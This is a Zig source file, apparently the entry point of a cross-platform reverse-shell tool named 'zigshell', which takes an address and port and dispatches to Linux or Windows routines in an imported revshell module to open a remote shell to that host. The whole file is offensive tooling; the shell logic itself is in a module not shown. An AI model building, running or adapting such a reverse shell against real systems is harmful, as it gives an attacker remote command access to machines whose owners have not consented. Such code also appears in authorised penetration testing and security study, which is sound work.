const builtin = @import("builtin");
const std = @import("std");
const revshell = @import("./revshell.zig");

const USAGE =
    \\USAGE
    \\=====
    \\
    \\  zigshell <ADDR> <PORT>
    \\
    \\EXAMPLE
    \\=======
    \\
    \\  zigshell 127.0.0.1 4444
;

pub fn print(comptime format: []const u8, args: anytype) !void {
    const stdout_file = std.io.getStdOut().writer();
    var bw = std.io.bufferedWriter(stdout_file);
    const stdout = bw.writer();
    try stdout.print(format, args);
    try bw.flush();
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();

    // Parse arguments
    const args = try std.process.argsAlloc(gpa.allocator());
    defer std.process.argsFree(gpa.allocator(), args);

    if (args.len < 3) {
        try print("{s}\n", .{USAGE});
        std.process.exit(1);
    }

    const addr = args[1];
    const port = try std.fmt.parseInt(u16, args[2], 10);

    // Execute reverse shell for each platform
    switch (builtin.os.tag) {
        .linux => try revshell.linux.run(gpa.allocator(), addr, port),
        // .macos => try revshell.macos.run(gpa.allocator(), addr, port),
        .windows => try revshell.windows.run(gpa.allocator(), addr, port),
        else => try print("The operating system is unsupported.\n", .{}),
    }
}
